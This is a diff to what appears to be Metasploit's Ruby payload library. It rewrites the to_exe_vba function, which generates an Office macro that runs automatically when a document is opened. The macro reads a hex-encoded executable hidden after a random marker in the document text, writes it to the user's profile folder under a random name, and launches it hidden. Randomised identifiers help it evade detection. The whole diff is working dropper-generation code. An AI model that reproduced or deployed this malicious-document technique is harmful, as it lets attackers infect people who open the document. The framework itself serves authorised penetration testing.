@@ -302,56 +302,99 @@ require 'rex/pescan'
 
 		return mo
 	end
-
 	def self.to_exe_vba(exes='')
 		exe = exes.unpack('C*')
 		vba = ""
-		pcs = (exe.length/2000)+1
 		idx = 0
+		maxbytes = 2000
 
+		var_magic    = Rex::Text.rand_text_alpha(10).capitalize
+		var_base     = Rex::Text.rand_text_alpha(5).capitalize
 		var_base_idx = 0
-		var_base     =  Rex::Text.rand_text_alpha(2).capitalize
 
-		var_bytes = var_base + (var_base_idx+=1).to_s
-		var_initx = var_base +  Rex::Text.rand_text_alpha(1) + (var_base_idx+=1).to_s
-
-		vba << "Dim #{var_bytes}(#{exe.length}) as Byte\r\n\r\n"
-		1.upto(pcs) do |pc|
-			max = 0
-			vba << "Sub #{var_initx}#{pc}()\r\n"
-
-			while(c = exe[idx] and max < 2000)
-				vba << "\t#{var_bytes}(#{idx}) = &H#{("%.2x" % c).upcase}\r\n"
-				idx += 1
-				max += 1
-			end
-			vba << "End Sub\r\n"
-		end
-
-		var_lname = var_base + (var_base_idx+=1).to_s
-		var_lpath = var_base + (var_base_idx+=1).to_s
+		# First write the macro into the vba file
+		var_fname = var_base + (var_base_idx+=1).to_s
+		var_fenvi = var_base + (var_base_idx+=1).to_s
+		var_fhand = var_base + (var_base_idx+=1).to_s
+		var_parag = var_base + (var_base_idx+=1).to_s
+		var_itemp = var_base + (var_base_idx+=1).to_s
+		var_btemp = var_base + (var_base_idx+=1).to_s
 		var_appnr = var_base + (var_base_idx+=1).to_s
-		var_datnr = var_base + (var_base_idx+=1).to_s
+		var_index = var_base + (var_base_idx+=1).to_s
+		var_gotmagic = var_base + (var_base_idx+=1).to_s
+		var_farg = var_base + (var_base_idx+=1).to_s
+		var_stemp = var_base + (var_base_idx+=1).to_s
 
+		# Function 1 extracts the binary
+		func_name1 = var_base + (var_base_idx+=1).to_s
+
+		# Function 2 executes the binary
+		func_name2 = var_base + (var_base_idx+=1).to_s
+
+		vba << "'**************************************************************\r\n"
+		vba << "'*\r\n"
+		vba << "'* This code is now split into two pieces:\r\n"
+		vba << "'*  1. The Macro. This must be copied into the Office document\r\n"
+		vba << "'*     macro editor. This macro will run on startup.\r\n"
+		vba << "'*\r\n"
+		vba << "'*  2. The Data. The hex dump at the end of this output must be\r\n"
+		vba << "'*     appended to the end of the document contents.\r\n"
+		vba << "'*\r\n"
+		vba << "'**************************************************************\r\n"
+		vba << "'*\r\n"
+		vba << "'* MACRO CODE\r\n"
+		vba << "'*\r\n"
+		vba << "'**************************************************************\r\n"
+
+		# The wrapper makes it easier to integrate it into other macros
 		vba << "Sub Auto_Open()\r\n"
+		vba << "\t#{func_name1}\r\n"
+		vba << "End Sub\r\n"
+
+		vba << "Sub #{func_name1}()\r\n"
 		vba << "\tDim #{var_appnr} As Integer\r\n"
-		vba << "\tDim #{var_datnr} As Integer\r\n"
-		vba << "\tDim #{var_lname} As String\r\n"
-		vba << "\tDim #{var_lpath} As String\r\n"
-		vba << "\t#{var_lname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
-		vba << "\t#{var_lpath} = Environ(\"USERPROFILE\")\r\n"
-		vba << "\tChDrive (#{var_lpath})\r\n"
-		vba << "\tChDir (#{var_lpath})\r\n"
-		vba << "\t#{var_datnr} = FreeFile()\r\n"
-		vba << "\tOpen #{var_lname}  For Binary Access Read Write As #{var_datnr}\r\n"
+		vba << "\tDim #{var_fname} As String\r\n"
+		vba << "\tDim #{var_fenvi} As String\r\n"
+		vba << "\tDim #{var_fhand} As Integer\r\n"
+		vba << "\tDim #{var_parag} As Paragraph\r\n"
+		vba << "\tDim #{var_index} As Integer\r\n"
+		vba << "\tDim #{var_gotmagic} As Boolean\r\n"
+		vba << "\tDim #{var_itemp} As Integer\r\n"
+		vba << "\tDim #{var_stemp} As String\r\n"
+		vba << "\tDim #{var_btemp} As Byte\r\n"
+		vba << "\tDim #{var_magic} as String\r\n"
+		vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
+		vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
+		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+		vba << "\tChDrive (#{var_fenvi})\r\n"
+		vba << "\tChDir (#{var_fenvi})\r\n"
+		vba << "\t#{var_fhand} = FreeFile()\r\n"
+		vba << "\tOpen #{var_fname} For Binary As #{var_fhand}\r\n"
+		vba << "\tFor Each #{var_parag} in ActiveDocument.Paragraphs\r\n"
+		vba << "\t\tDoEvents\r\n"
+		vba << "\t\t\t#{var_stemp} = #{var_parag}.Range.Text\r\n"
+		vba << "\t\tIf (#{var_gotmagic} = True) Then\r\n"
+		vba << "\t\t\t#{var_index} = 1\r\n"
+		vba << "\t\t\tWhile (#{var_index} < Len(#{var_stemp}))\r\n"
+		vba << "\t\t\t\t#{var_btemp} = Mid(#{var_stemp},#{var_index},4)\r\n"
+		vba << "\t\t\t\tPut ##{var_fhand}, , #{var_btemp}\r\n"
+		vba << "\t\t\t\t#{var_index} = #{var_index} + 4\r\n"
+		vba << "\t\t\tWend\r\n"
+		vba << "\t\tElseIf (InStr(1,#{var_stemp},#{var_magic}) > 0 And Len(#{var_stemp}) > 0) Then\r\n"
+		vba << "\t\t\t#{var_gotmagic} = True\r\n"
+		vba << "\t\tEnd If\r\n"
+		vba << "\tNext\r\n"
+		vba << "\tClose ##{var_fhand}\r\n"
+		vba << "\t#{func_name2}(#{var_fname})\r\n"
+		vba << "End Sub\r\n"
 
-		1.upto(pcs) do |pc|
-			vba << "\t#{var_initx}#{pc}\r\n"
-		end
-
-		vba << "\tPut #{var_datnr}, , #{var_bytes}\r\n"
-		vba << "\tClose #{var_datnr}\r\n"
-		vba << "\t#{var_appnr} = Shell(#{var_lname}, vbHide)\r\n"
+		vba << "Sub #{func_name2}(#{var_farg} As String)\r\n"
+		vba << "\tDim #{var_appnr} As Integer\r\n"
+		vba << "\tDim #{var_fenvi} As String\r\n"
+		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+		vba << "\tChDrive (#{var_fenvi})\r\n"
+		vba << "\tChDir (#{var_fenvi})\r\n"
+		vba << "\t#{var_appnr} = Shell(#{var_farg}, vbHide)\r\n"
 		vba << "End Sub\r\n"
 
 		vba << "Sub AutoOpen()\r\n"
@@ -361,7 +404,25 @@ require 'rex/pescan'
 		vba << "Sub Workbook_Open()\r\n"
 		vba << "\tAuto_Open\r\n"
 		vba << "End Sub\r\n"
+		vba << "'**************************************************************\r\n"
+		vba << "'*\r\n"
+		vba << "'* PAYLOAD DATA\r\n"
+		vba << "'*\r\n"
+		vba << "'**************************************************************\r\n\r\n\r\n"
+		vba << "#{var_magic}\r\n"
 
+		# Writing the bytes of the exe to the file
+		1.upto(exe.length) do |pc|
+			while(c = exe[idx])
+				vba << "&H#{("%.2x" % c).upcase}"
+				if (idx > 1 and (idx % maxbytes) == 0)
+					# When maxbytes are written make a new paragrpah
+					vba << "\r\n"
+				end
+				idx += 1
+			end
+		end
+		return vba
 	end
 
 	def self.to_win32pe_vba(framework, code, opts={})
